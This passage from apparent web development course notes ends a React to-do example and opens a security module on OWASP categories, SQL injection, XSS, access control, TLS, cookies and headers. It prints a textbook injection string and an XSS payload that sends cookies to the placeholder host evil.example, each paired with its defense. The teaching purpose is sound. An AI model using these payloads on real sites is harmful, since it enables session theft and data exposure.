+<div class="plantuml"><img src="https://www.plantuml.com/plantuml/svg/~1U5vLZ35EGp4G1NkVuX4Qa98Bf40H53GfSW2QnLxzRydUNNdNHBaz2gH8gYVDqyp1WqRCtjAJ3LeweT55Py0x1mcbK4CelZL2EqeTdAEgfEkIB8snET5W2MJjfi8IN_AYPt74ol2WuDSDo65uFjPbZVSs-Lx_M6ih3tQfReqkliLWqn4E_c49_-_aM-TpC4iox7PloDZ3XffZKHGzIyf_tB2_kTTZMZgmbDdRBp5NLbW"></div>
+<hr>
+<h2 class="atx" id="practical-scenario-the-to-do-list-as-components">Practical Scenario: The To-Do List as Components</h2>
+<p>Maya's TaskNest as components. <code>useState</code> holds the tasks. <code>toggleTask(id)</code> creates a new array in which only the matching task has <code>done</code> flipped, and <code>setTasks</code> triggers a re-render. Each <code>TodoItem</code> receives its data via <code>{...t}</code> and an <code>onToggle</code> handler. This is <strong>the same idea as the SQL <code>UPDATE</code> statement from the earlier to-do list, just triggered by a click instead of a form submit.</strong> Swap the hard-coded array for the <code>fetch()</code> call from the API section and it becomes a <strong>real, backend-driven app.</strong></p>
+<pre><code class="fenced-code-block language-jsx"><span class="token comment">// TodoApp.jsx</span>
+<span class="token keyword">function</span> <span class="token function">TodoApp</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+  <span class="token keyword">const</span> <span class="token punctuation">[</span>tasks<span class="token punctuation">,</span> setTasks<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">useState</span><span class="token punctuation">(</span><span class="token punctuation">[</span>
+    <span class="token punctuation">{</span> <span class="token literal-property property">id</span><span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token literal-property property">text</span><span class="token operator">:</span> <span class="token string">'Buy milk'</span><span class="token punctuation">,</span> <span class="token literal-property property">done</span><span class="token operator">:</span> <span class="token boolean">false</span> <span class="token punctuation">}</span>
+  <span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+  <span class="token keyword">function</span> <span class="token function">toggleTask</span><span class="token punctuation">(</span><span class="token parameter">id</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token function">setTasks</span><span class="token punctuation">(</span>tasks<span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token parameter">t</span> <span class="token operator">=&gt;</span>
+      t<span class="token punctuation">.</span>id <span class="token operator">===</span> id <span class="token operator">?</span> <span class="token punctuation">{</span> <span class="token operator">...</span>t<span class="token punctuation">,</span> <span class="token literal-property property">done</span><span class="token operator">:</span> <span class="token operator">!</span>t<span class="token punctuation">.</span>done <span class="token punctuation">}</span> <span class="token operator">:</span> t
+    <span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token punctuation">}</span>
+
+  <span class="token keyword">return</span> <span class="token punctuation">(</span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ul</span><span class="token punctuation">&gt;</span></span><span class="token plain-text">
+      </span><span class="token punctuation">{</span>tasks<span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token parameter">t</span> <span class="token operator">=&gt;</span> <span class="token punctuation">(</span>
+        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token class-name">TodoItem</span></span> <span class="token attr-name">key</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">{</span>t<span class="token punctuation">.</span>id<span class="token punctuation">}</span></span> <span class="token spread"><span class="token punctuation">{</span><span class="token operator">...</span>t<span class="token punctuation">}</span></span>
+          <span class="token attr-name">onToggle</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">{</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token function">toggleTask</span><span class="token punctuation">(</span>t<span class="token punctuation">.</span>id<span class="token punctuation">)</span><span class="token punctuation">}</span></span> <span class="token punctuation">/&gt;</span></span>
+      <span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token plain-text">
+    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ul</span><span class="token punctuation">&gt;</span></span>
+  <span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span></code></pre>
+<hr>
+<h2 class="atx" id="frontend-recap">Frontend Recap</h2>
+<ul>
+<li>Modern frontend development is <strong>still HTML, CSS and JavaScript</strong>, just organized around small, reusable <strong>components</strong> instead of one big page script.</li>
+<li>A component <strong>bundles its markup, state and behaviour together</strong>; state changes trigger <strong>automatic re-renders</strong> instead of manual DOM edits.</li>
+<li><strong>Data flows down through props, and changes flow back up through events</strong>, keeping a large component tree predictable.</li>
+<li><strong>React, Vue, Angular and Svelte</strong> all solve the same UI-sync problem differently; none is universally "best".</li>
+<li>A <strong>single-page application</strong> loads once and updates itself with JavaScript, trading full page reloads for <strong>client-side routing and data fetching</strong>.</li>
+<li>Components talk to a backend (or a public provider) through <strong>REST APIs</strong>: resources, HTTP verbs already covered, and <strong>JSON</strong> as the shared data format.</li>
+</ul>
+<p>Maya is delighted. TaskNest feels instant. Then a message arrives from a stranger...</p>
+<hr>
+<h2 class="atx" id="why-web-security-matters">Why Web Security Matters</h2>
+<p>Every module so far has built something that <strong>accepts input</strong>: forms (Module 3), queries (Module 5), requests (Module 6).</p>
+<ul>
+<li><strong>The uncomfortable truth:</strong> anything that accepts input from a user can potentially be made to accept input from an <em>attacker</em> instead.</li>
+<li><strong>The stakes:</strong> leaked passwords, stolen sessions, defaced pages, or an entire database exposed. Attackers may want to take over or cripple your system, or quietly take your data. Data is enormously valuable (industries are moving to data-driven decisions), so stealing it is both a privacy violation and a business loss.</li>
+<li>Web apps involve constant two-party communication between a client and a remote server, <strong>over the web, which is inherently insecure.</strong> Someone can silently watch the traffic, or attack through the network or the system itself.</li>
+<li><strong>Security isn't a separate feature bolted on at the end. It is a property of how every earlier piece was built:</strong> your architecture, client-server communication, HTML, SQL queries and even cookies.</li>
+</ul>
+<p>This module keeps to a focused set of attack scenarios: what is considered vulnerable, what can go wrong, and what the fixes are.</p>
+<hr>
+<h2 class="atx" id="the-owasp-top-10">The OWASP Top 10</h2>
+<p><strong>OWASP (Open Web Application Security Project)</strong> ranks the most common and damaging vulnerabilities from real-world testing data across millions of applications. <strong>This module focuses on A05, A07, A04 and A01</strong> (marked ⭐).</p>
+<table>
+<thead>
+<tr>
+<th>Rank</th>
+<th>Category</th>
+<th>In this module</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>A01</td>
+<td>Broken Access Control</td>
+<td>⭐</td>
+</tr>
+<tr>
+<td>A02</td>
+<td>Security Misconfiguration</td>
+<td></td>
+</tr>
+<tr>
+<td>A03</td>
+<td>Software Supply Chain Failures</td>
+<td></td>
+</tr>
+<tr>
+<td>A04</td>
+<td>Cryptographic Failures</td>
+<td>⭐</td>
+</tr>
+<tr>
+<td>A05</td>
+<td>Injection (includes SQL injection and XSS)</td>
+<td>⭐</td>
+</tr>
+<tr>
+<td>A06</td>
+<td>Insecure Design</td>
+<td></td>
+</tr>
+<tr>
+<td>A07</td>
+<td>Authentication Failures</td>
+<td>⭐</td>
+</tr>
+<tr>
+<td>A08</td>
+<td>Software or Data Integrity Failures</td>
+<td></td>
+</tr>
+<tr>
+<td>A09</td>
+<td>Security Logging &amp; Alerting Failures</td>
+<td></td>
+</tr>
+<tr>
+<td>A10</td>
+<td>Mishandling of Exceptional Conditions</td>
+<td></td>
+</tr>
+</tbody></table>
+<h3 class="atx" id="common-web-vulnerabilities-at-a-glance">Common Web Vulnerabilities at a Glance</h3>
+<ul>
+<li><strong>Injection (A05):</strong> untrusted input is <strong>interpreted as code or commands</strong> instead of plain data. SQL injection and XSS both live here. It happens without the user's knowledge, hence "injection".</li>
+<li><strong>Authentication failures (A07):</strong> <strong>weak, guessable, or poorly protected login mechanisms.</strong> Login is how we tell clients apart to give them different privileges, personalized services and so on, which makes it the most common way into a system.</li>
+<li><strong>Broken access control (A01):</strong> a user can <strong>do or see something they were never authorized to.</strong> Servers hold many resources, and not every client may touch everything.</li>
+<li><strong>Cryptographic failures (A04):</strong> <strong>sensitive data left unencrypted</strong>, in transit or at rest. Encryption forces an attacker to spend significant compute time and effort; without it, reading the data is trivial.</li>
+<li><strong>Notice the pattern:</strong> almost every category comes down to <strong>trusting something that shouldn't have been trusted.</strong></li>
+</ul>
+<blockquote>
+<p><strong>Note for Review — Pro-Tip:</strong> The Top 10 is a <em>ranking</em>, so A03 (supply chain), appears later in these notes too, under "keep dependencies updated". Memorize the four focus categories with their codes: <strong>A01, A04, A05, A07</strong>.</p>
+</blockquote>
+<hr>
+<h2 class="atx" id="sql-injection">SQL Injection</h2>
+<h3 class="atx" id="the-idea">The Idea</h3>
+<p>Recall Module 5: a SQL query is <strong>just a string</strong> the backend sends to the database.</p>
+<ul>
+<li><strong>The vulnerability:</strong> if user input is <strong>pasted directly into that string</strong>, the user can write part of the query themselves.</li>
+<li><strong>The attack:</strong> carefully crafted input <strong>changes the query's meaning entirely</strong>, often to bypass a check or read data it should not.</li>
+<li>This is the textbook example of <strong>Injection (OWASP A05)</strong>, and one of the most well-known vulnerabilities in web history.</li>
+</ul>
+<h3 class="atx" id="a-worked-example">A Worked Example</h3>
+<p>The backend builds the query by <strong>string concatenation</strong>. The query code never changes; only the variable <code>userInput</code> does, and it may come from anywhere (a form, a file). If an attacker enters the malicious input shown below, the query becomes <code>... WHERE name = '' OR '1'='1'</code>. Because <code>'1'='1'</code> is <strong>always true</strong>, the condition holds for every row, so it <strong>returns every row in the table, not just one instructor.</strong></p>
+<pre><code class="fenced-code-block language-javascript"><span class="token comment">// vulnerable.js</span>
+<span class="token comment">// VULNERABLE -- string concatenation</span>
+<span class="token keyword">const</span> query <span class="token operator">=</span>
+  <span class="token string">"SELECT * FROM instructor WHERE name = '"</span>
+  <span class="token operator">+</span> userInput <span class="token operator">+</span> <span class="token string">"';"</span><span class="token punctuation">;</span></code></pre>
+<p>If an attacker enters this as <code>userInput</code>:</p>
+<pre><code class="fenced-code-block language-text">' OR '1'='1</code></pre>
+<p>In Boolean terms, for any condition <span class="katex"><span class="katex-mathml"></span><span aria-hidden="true" class="katex-html"><span class="base"><span style="height:0.6833em;" class="strut"></span><span style="margin-right:0.13889em;" class="mord mathnormal">P</span></span></span></span> (here, the name check):</p>
+<span class="katex-display"><span class="katex"><span class="katex-mathml"></span><span aria-hidden="true" class="katex-html"><span class="base"><span style="height:0.6833em;" class="strut"></span><span style="margin-right:0.13889em;" class="mord mathnormal">P</span><span style="margin-right:0.2222em;" class="mspace"></span><span class="mbin">∨</span><span style="margin-right:0.2222em;" class="mspace"></span></span><span class="base"><span style="height:0.6151em;" class="strut"></span><span class="mord text"><span class="mord">true</span></span><span style="margin-right:0.2778em;" class="mspace"></span><span class="mrel">≡</span><span style="margin-right:0.2778em;" class="mspace"></span></span><span class="base"><span style="height:0.6151em;" class="strut"></span><span class="mord text"><span class="mord">true</span></span></span></span></span></span><p>So the <code>WHERE</code> filter no longer filters anything. The query was meant to be constrained to matching rows, but the attacker can now read all client data stored in the database.</p>
+<h3 class="atx" id="defense-parameterized-queries">Defense: Parameterized Queries</h3>
+<p>The value is passed as a <strong>parameter, never as part of the query text.</strong> The <code>?</code> placeholder is filled in by the database driver. This is exactly the pattern Module 5's PHP and Node.js examples already used: <strong>the database driver keeps user data and SQL syntax strictly separate, so a malicious string can never be reinterpreted as code.</strong></p>
+<pre><code class="fenced-code-block language-javascript"><span class="token comment">// safe.js</span>
+<span class="token comment">// SAFE -- the value is a parameter,</span>
+<span class="token comment">// never part of the query text</span>
+<span class="token keyword">const</span> <span class="token punctuation">[</span>rows<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">await</span> conn<span class="token punctuation">.</span><span class="token function">execute</span><span class="token punctuation">(</span>
+  <span class="token string">'SELECT * FROM instructor WHERE name = ?'</span><span class="token punctuation">,</span>
+  <span class="token punctuation">[</span>userInput<span class="token punctuation">]</span>
+<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
+<blockquote>
+<p><strong>Note for Review — Pro-Tip:</strong> "Sanitizing quotes by hand" is <em>not</em> the expected answer on an exam. The expected answer is <strong>parameterized (prepared) queries</strong>: the query structure is fixed first, and data is supplied separately.</p>
+</blockquote>
+<hr>
+<h2 class="atx" id="cross-site-scripting-xss">Cross-Site Scripting (XSS)</h2>
+<h3 class="atx" id="the-idea-1">The Idea</h3>
+<p>Recall Module 3: <code>innerHTML</code> inserts a string directly as <strong>live HTML</strong> on the page.</p>
+<ul>
+<li><strong>The vulnerability:</strong> if that string comes from another user's input (a comment, a profile name) and <strong>isn't sanitized</strong>, it can contain a <code>&lt;script&gt;</code>.</li>
+<li><strong>The attack:</strong> that script <strong>runs in the victim's browser, with the victim's cookies and session, not the attacker's.</strong> The attacker can then act as an imposter of that client.</li>
+<li>This is <strong>Injection (A05) again</strong>, just landing in the <strong>browser's HTML parser</strong> instead of a database engine.</li>
+</ul>
+<h3 class="atx" id="a-worked-example-1">A Worked Example</h3>
+<p>The code puts a user's comment straight into the page with <code>innerHTML</code>. The attacker posts an <code>&lt;img&gt;</code> whose source (<code>x</code>) is invalid, so the image <strong>fails to load</strong>, and the browser quietly fires its <code>onerror</code> handler. Instead of a harmless caption, the handler runs the attacker's script, which sends the visitor's session cookie to the attacker. <strong>Every later visitor's session cookie goes straight to them.</strong> (The domain <code>evil.example</code> is a deliberate placeholder.)</p>
+<pre><code class="fenced-code-block language-javascript"><span class="token comment">// vulnerable.js</span>
+<span class="token comment">// VULNERABLE</span>
+document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'comments'</span><span class="token punctuation">)</span>
+  <span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> userComment<span class="token punctuation">;</span></code></pre>
+<p>If an attacker posts this as <code>userComment</code> (course illustration):</p>
+<pre><code class="fenced-code-block language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>x</span> <span class="token special-attr"><span class="token attr-name">onerror</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value javascript language-javascript"><span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">'https://evil.example/steal?c='</span>
+  <span class="token operator">+</span> document<span class="token punctuation">.</span>cookie<span class="token punctuation">)</span></span><span class="token punctuation">"</span></span></span><span class="token punctuation">&gt;</span></span></code></pre>
+<h3 class="atx" id="types-of-xss">Types of XSS</h3>
+<table>
+<thead>
+<tr>
+<th>Type</th>
+<th>How it happens</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Stored</td>
+<td>The malicious script is <strong>saved on the server</strong> (e.g. in a comment) and served to every later visitor</td>
+</tr>
+<tr>
+<td>Reflected</td>
+<td>The script is <strong>bounced straight back</strong> in a URL parameter's echoed response; the victim has to click a crafted link</td>
+</tr>
+<tr>
+<td>DOM-based</td>
+<td><strong>Client-side JavaScript itself</strong> inserts untrusted data into the page; the server is never even involved</td>
+</tr>
+</tbody></table>
+<p><em>All three share the same root cause: untrusted data ends up somewhere the browser will execute it as code.</em></p>
+<h3 class="atx" id="defending-against-xss">Defending Against XSS</h3>
+<ul>
+<li><strong>Prefer <code>textContent</code> over <code>innerHTML</code>:</strong> <code>textContent</code> always treats its argument as plain text, never as markup to parse.</li>
+<li><strong>Escape or sanitize any HTML you must allow:</strong> convert <code>&lt;</code>, <code>&gt;</code> and <code>&amp;</code> into their safe entity equivalents (for example <code>&amp;lt;</code>, <code>&amp;gt;</code>, <code>&amp;amp;</code>) before inserting.</li>
+<li><strong>Frameworks help by default:</strong> React, for instance, <strong>escapes values automatically</strong> unless you explicitly opt out.</li>
+<li><strong>Content-Security-Policy:</strong> an HTTP header that tells the browser <strong>which script sources are allowed to run at all.</strong> The server can build an allow-list (or block-list) of script sources this way.</li>
+</ul>
+<hr>
+<h2 class="atx" id="authentication-vs-authorization">Authentication vs Authorization</h2>
+<p>Recall Module 5:</p>
+<ul>
+<li><strong>Authentication</strong> answers *"Who are you?"*</li>
+<li><strong>Authorization</strong> answers *"What are you allowed to do?"*</li>
+</ul>
+<p><strong>Authentication failures</strong> (OWASP A07) are weaknesses in verifying identity in the first place. <strong>Broken access control</strong> (OWASP A01) is currently the single most common category found in testing, and is a failure of the <em>second</em> question. <strong>A system can authenticate someone perfectly and still be broken, if it never checks whether they are authorized for what they are requesting.</strong></p>
+<div class="plantuml"><img src="https://www.plantuml.com/plantuml/svg/~1U5vzpp5Fmq0C1U3zViKZB31KWWaf0xGiNJfrOSbY9Mvoqfql-7n8oQz7bp9KI31vy7kVx7qsKYinkBjPQOo4G4igXXpPICW5lXWiGVqu6GQlt9jFukea6GEZEVDduMmDA4DnVwh9zr3uDdCeDh6OxwcsE-cQZoc1bB6ayjOrdJnSo8VSul3qyhXHz0-LrAyt4XaYBPN2a7vfprTj_KCxSqv5UxvUp_adTbHcSOhTxXNaQ9ihMlYXVc4BParVB6xTDhNNOcQDFcUV1AEI60zkppAK6Bu1eojwNm"></div>
+<h3 class="atx" id="common-authentication-weaknesses">Common Authentication Weaknesses</h3>
+<ul>
+<li><strong>Weak or reused passwords:</strong> a password breached on one site is immediately tried against others (<strong>credential stuffing</strong>). Easily guessed passwords (short, or based on a birth date or favourite topic) fall quickly. This is why sites ask you to change passwords periodically.</li>
+<li><strong>No rate limiting:</strong> without a limit on login attempts, an attacker can simply <strong>guess passwords automatically</strong>, spending computing resources until one works.</li>
+<li><strong>Missing multi-factor authentication:</strong> a stolen password alone is enough to get in. Adding an OTP or SMS code (two-factor or more) raises the bar.</li>
+<li><strong>Predictable password-reset flows:</strong> a guessable reset link or security question can <strong>bypass the password entirely.</strong></li>
+<li>Module 5's <strong>hashing and salting</strong> defend the <em>stored</em> password. These weaknesses live earlier, in <strong>how login itself is designed.</strong></li>
+</ul>
+<h3 class="atx" id="broken-access-control-a-closer-look">Broken Access Control: A Closer Look</h3>
+<ul>
+<li>Being logged in only proves <strong>who you are</strong>. The server must <strong>separately check what that identity is allowed to touch.</strong></li>
+<li><strong>Insecure Direct Object Reference (IDOR):</strong> a classic example: <code>/invoice?id=1002</code> works, so a user simply tries <code>id=1003</code>.</li>
+<li><strong>The failure:</strong> if the server fetches whatever ID is asked for <strong>without checking it belongs to the current session</strong>, that request succeeds.</li>
+<li><strong>The fix is simple to state and easy to forget:</strong> <em>every request that touches a specific record must confirm the current user is allowed to touch that record.</em> Server-side checks are added on top of any client-side logic.</li>
+</ul>
+<blockquote>
+<p><strong>Note for Review — Pro-Tip:</strong> "A user is logged in" is <strong>not</strong> an authorization check. When an exam scenario says the attacker used <em>their own valid session</em>, think <strong>A01 / IDOR</strong>, not A07.</p>
+</blockquote>
+<hr>
+<h2 class="atx" id="same-origin-policy-and-cors">Same-Origin Policy and CORS</h2>
+<ul>
+<li><strong>Same-origin policy:</strong> by default, a browser <strong>blocks JavaScript on one site from reading responses from a different site.</strong></li>
+<li><strong>Why it matters:</strong> without it, a malicious page could quietly use your logged-in session to <strong>read your email or bank data from another tab.</strong></li>
+<li><strong>CORS (Cross-Origin Resource Sharing):</strong> a set of <strong>response headers</strong> a server uses to <strong>explicitly allow specific other origins</strong> to call its API. The same-origin policy is the browser-side protection; CORS is the server-side way to open controlled exceptions.</li>
+<li>This is the policy quietly at work every time an API call from one domain to another <strong>succeeds, or is mysteriously blocked.</strong></li>
+</ul>
+<hr>
+<h2 class="atx" id="https-and-the-tls-handshake">HTTPS and the TLS Handshake</h2>
+<h3 class="atx" id="https-and-secure-communication">HTTPS and Secure Communication</h3>
+<ul>
+<li>Recall Module 1: <strong>HTTP is plain text; HTTPS wraps it in TLS (Transport Layer Security) encryption.</strong></li>
+<li><strong>Without HTTPS:</strong> passwords, session cookies and page content all travel across the network <strong>exactly as typed.</strong></li>
+<li>This is <strong>Cryptographic Failure (A04)</strong>: one of OWASP's top categories, and <strong>one of the simplest to eliminate entirely.</strong></li>
+<li>Every login form, every cookie, every API call from earlier modules <strong>assumes this layer is doing its job underneath.</strong></li>
+</ul>
+<h3 class="atx" id="http-vs-https-what-an-eavesdropper-sees">HTTP vs HTTPS: What an Eavesdropper Sees</h3>
+<p>An <strong>eavesdropper</strong> silently watches the conversation between client and server. On plain HTTP, they read the username, password and session id directly. On HTTPS they see only <strong>unreadable ciphertext</strong>. <strong>Anyone on the same network, a public Wi-Fi hotspot or a compromised router, can read plain HTTP traffic; TLS makes the same traffic unreadable in transit.</strong> Ciphertext is produced by a hard cryptographic function, so turning it back into readable data is very expensive without the key.</p>
+<div class="plantuml"><img src="https://www.plantuml.com/plantuml/svg/~1U5wDa4zhma0GnU_xAQRQWr9SI3mPKCH3suC78K8lWJ99HbtSpAOp6_zy-wAsK0yjFRtXyUCzviqreiIkyUQX5Tms21xFeOkW3KLaD9us4M80STjTXDe9LT45DXT5tdg2taB2KKbwW0fb0ltb1LtuZdv2ESdXYz7VcBkWz1z1TqoPm6Wq0qqWWvL7n_2wNgzCcTxi5BAhaSFW8l04wsK-D9rIXKhG8poGrXBQbWIKIBE2EoLXR6YAtbLKS8kgno3rTDTn94aBLb9rWTzTFSNnvWqd-_Iw0oNGpz4tWVzeWC3-d1Ly6ZzF7lVB3sijSINdDb9jhIruqB4GrbXwWigrEv98fpYyDNm__o94R3G1QsT0YT7qTgLcJbntZVy4lwYYFm"></div>
+<h3 class="atx" id="the-tls-handshake-simplified">The TLS Handshake, Simplified</h3>
+<p>The handshake is always <strong>client-initiated</strong>. The browser announces which encryption it supports, the server replies with a certificate (typically carrying its <strong>public key</strong>) that proves its identity, and the browser checks that certificate. If something is wrong on the server side, the client finds out here. Both sides then <strong>derive a shared secret key</strong>, valid only for this client-server pair and this session, and <strong>all further traffic is encrypted with that key.</strong> The handshake happens <strong>once per connection, in milliseconds, before a single byte of your actual data is sent.</strong></p>
+<div class="plantuml"><img src="https://www.plantuml.com/plantuml/svg/~1U5vLZxrgmq0GX7iznSIDYo11_XfZZ56QfDOJh4-htE7JtR6xij7R1qKA9FNCzp5pLYEnQOpLGn7w6WcHvZmPT6IZH5KXiU12eMJOjPBloh83ATh_KSTosvAkQb6VqE60fmRlCN2o3uunewxXMNYlk7ioS78o5mivuHCwbPB5gcvXMnpmt62LhkmZ78k58JWoNan5yeqLvXdwqzihGi_9WithWiNoqk2oheRpxAuhy4TLjJXkQryRNB9vQEXPqRE46uEWdeHxA3jXmvKN-x7UcBS652E6ISopm8I68JW4_Nt7FUx1F6nvlC1dJlqqnczJo7sF"></div>
+<blockquote>
+<p><strong>Note for Review — Pro-Tip:</strong> Keep the roles straight: the <strong>certificate</strong> proves <em>who the server is</em>; the <strong>shared secret key</strong> is what actually <em>encrypts the data</em>. Also, hash functions (like SHA) and encryption are different things: a hash is one-way (used for stored passwords), while encryption is reversible with the key (used for traffic). The five steps shown here are a teaching simplification of the real protocol.</p>
+</blockquote>
+<hr>
+<h2 class="atx" id="secure-cookies-and-security-headers">Secure Cookies and Security Headers</h2>
+<h3 class="atx" id="secure-cookies-revisited">Secure Cookies, Revisited</h3>
+<p>Cookies retain state over stateless HTTP, remembering preferences and sessions, but they also open an attack surface. Module 5 introduced cookie attributes as <strong>features</strong>. Here they are read as <strong>specific defenses</strong>.</p>
+<table>
+<thead>
+<tr>
+<th>Attribute</th>
+<th>Defends against</th>
+<th>How</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>Secure</code></td>
+<td>Network eavesdropping</td>
+<td>Refuses to send the cookie over plain HTTP</td>
+</tr>
+<tr>
+<td><code>HttpOnly</code></td>
+<td>XSS specifically</td>
+<td>Even an injected script can't read a cookie marked HttpOnly</td>
+</tr>
+<tr>
+<td><code>SameSite</code></td>
+<td>Cross-site request forgery (CSRF)</td>
+<td>Limits when the cookie is sent on requests from other sites</td>
+</tr>
+</tbody></table>
+<p><em>Three attributes, three different attack categories. None of them are optional for a real login session.</em></p>
+<h3 class="atx" id="security-headers-a-quick-tour">Security Headers: A Quick Tour</h3>
+<p>These are HTTP <strong>response headers</strong> the server sends to tell the browser how to behave. <strong>Content-Security-Policy</strong> limits which script sources the browser will run at all, a strong second line of defense against XSS. <strong>X-Content-Type-Options</strong> stops the browser from "guessing" a file's type in a way attackers can abuse (<code>nosniff</code> means: do not guess). <strong>X-Frame-Options</strong> blocks the page from being embedded in another site's invisible frame (<strong>clickjacking</strong>). <strong>Strict-Transport-Security</strong> tells the browser to only ever use HTTPS for this site from now on, for a maximum age.</p>
+<pre><code class="fenced-code-block language-http"># response-headers.http
+<span class="token header"><span class="token header-name keyword">Content-Security-Policy</span><span class="token punctuation">:</span> <span class="token header-value csp languages-csp">default-src 'self'</span></span>
+<span class="token header"><span class="token header-name keyword">X-Content-Type-Options</span><span class="token punctuation">:</span> <span class="token header-value">nosniff</span></span>
+<span class="token header"><span class="token header-name keyword">X-Frame-Options</span><span class="token punctuation">:</span> <span class="token header-value">DENY</span></span>
+<span class="token header"><span class="token header-name keyword">Strict-Transport-Security</span><span class="token punctuation">:</span> <span class="token header-value hsts languages-hsts">max-age=63072000</span></span></code></pre>
+<p>The <code>max-age</code> is in seconds. Check the value:</p>
+<span class="katex-display"><span class="katex"><span class="katex-mathml"></span><span aria-hidden="true" class="katex-html"><span class="base"><span style="height:0.7278em;vertical-align:-0.0833em;" class="strut"></span><span class="mord">2</span><span style="margin-right:0.2222em;" class="mspace"></span><span class="mbin">×</span><span style="margin-right:0.2222em;" class="mspace"></span></span><span class="base"><span style="height:0.7278em;vertical-align:-0.0833em;" class="strut"></span><span class="mord">365</span><span style="margin-right:0.2222em;" class="mspace"></span><span class="mbin">×</span><span style="margin-right:0.2222em;" class="mspace"></span></span><span class="base"><span style="height:0.7278em;vertical-align:-0.0833em;" class="strut"></span><span class="mord">24</span><span style="margin-right:0.2222em;" class="mspace"></span><span class="mbin">×</span><span style="margin-right:0.2222em;" class="mspace"></span></span><span class="base"><span style="height:0.6444em;" class="strut"></span><span class="mord">3600</span><span style="margin-right:0.2778em;" class="mspace"></span><span class="mrel">=</span><span style="margin-right:0.2778em;" class="mspace"></span></span><span class="base"><span style="height:0.8889em;vertical-align:-0.1944em;" class="strut"></span><span class="mord">63</span><span class="mord"><span class="mpunct">,</span></span><span class="mord">072</span><span class="mord"><span class="mpunct">,</span></span><span class="mord">000</span><span class="mord text"><span class="mord">&nbsp;seconds</span></span><span style="margin-right:0.2778em;" class="mspace"></span><span class="mrel">=</span><span style="margin-right:0.2778em;" class="mspace"></span></span><span class="base"><span style="height:0.8389em;vertical-align:-0.1944em;" class="strut"></span><span class="mord">2</span><span class="mord text"><span class="mord">&nbsp;years</span></span></span></span></span></span><hr>
+<h2 class="atx" id="secure-coding-practices">Secure Coding Practices</h2>
+<h3 class="atx" id="input-validation">Input Validation</h3>
+<p>Recall Module 3's form validation: that was about <strong>user experience</strong>, catching mistakes before they are submitted.</p>
+<ul>
+<li><strong>The security version is different:</strong> client-side validation is a <strong>convenience, never a defense.</strong> It runs in the attacker's own browser, which they fully control.</li>
+<li><strong>The rule:</strong> <strong>validate and sanitize again on the server, every time</strong>, no matter what the client already checked. This adds a little cost per request but makes the system safer.</li>
+<li>Prefer <strong>allow-lists</strong> ("only these characters/formats are valid") over <strong>block-lists</strong> ("block these known-bad patterns"). Attackers are creative about what a block-list misses.</li>
+</ul>
+<h3 class="atx" id="least-privilege-and-defense-in-depth">Least Privilege and Defense in Depth</h3>
+<ul>
+<li><strong>Principle of least privilege:</strong> give every account, process and database user <strong>only the access it strictly needs.</strong> Start with nothing and add privileges as required, which is stricter than starting broad and removing.</li>
+<li><strong>Example:</strong> the database user an application connects with, using a schema like Module 5's, <strong>shouldn't have permission to drop tables.</strong></li>
+<li><strong>Defense in depth:</strong> layer <strong>multiple independent defenses</strong>, so one failure (a missed validation, a leaked credential) <strong>doesn't mean total compromise.</strong></li>
+</ul>
+<p>Parameterized queries, hashed passwords, HTTPS and least privilege together are exactly this kind of layering. An attacker has to defeat every layer in turn, so even if one is compromised the others remain intact.</p>
+<div class="plantuml"><img src="https://www.plantuml.com/plantuml/svg/~1U5vrZxjkmp0CHNTz1PlCHk77NAH1W7Rm4C0UlH0HwmgXv8IY3AHVNzZAq0wUU8PxxWKFKL4qUJOlDy7H8p0-fgGGFIa6D4nV2Zg1kF5RmJgXYxefcELY69bWzwwAbol93Z02mhv3zlyJdtr_xk0L-hPRGrp2lbqAZvpeRrL7CfCKqLaQmepiB2vhMQesf3CAUb8IzqDs2FT4uYXcfzvmMiAenKtSx9X66iBf22a-V-1cmpgXujfhdu4F8Ge6eIZUW4l3PQRAS9MfDbndQWmtArbpe62Jvr_hl7rh"></div>
+<h3 class="atx" id="dependencies-and-secrets">Dependencies and Secrets</h3>
+<ul>
+<li><strong>Keep dependencies updated:</strong> a vulnerability found in a popular package (OWASP's <strong>Software Supply Chain Failures, A03</strong>) becomes <strong>everyone's problem</strong> who uses it. Limiting third-party dependencies also helps.</li>
+<li><strong>Never hardcode secrets:</strong> API keys, database passwords and tokens should <strong>never appear directly in source code.</strong></li>
+<li><strong>Use environment variables or a secrets manager instead:</strong> this is exactly <strong>why <code>.env</code> files are excluded from version control.</strong> The code reads the secret through a variable at runtime.</li>
+<li>A perfectly secure login flow is <strong>still broken the moment its database password is sitting in a public GitHub repository.</strong></li>
+</ul>
+<hr>
+<h2 class="atx" id="practical-scenarios-attacks-and-fixes">Practical Scenarios: Attacks and Fixes</h2>
+<h3 class="atx" id="scenario-1--broken-access-control-idor">Scenario 1 — Broken Access Control (IDOR)</h3>
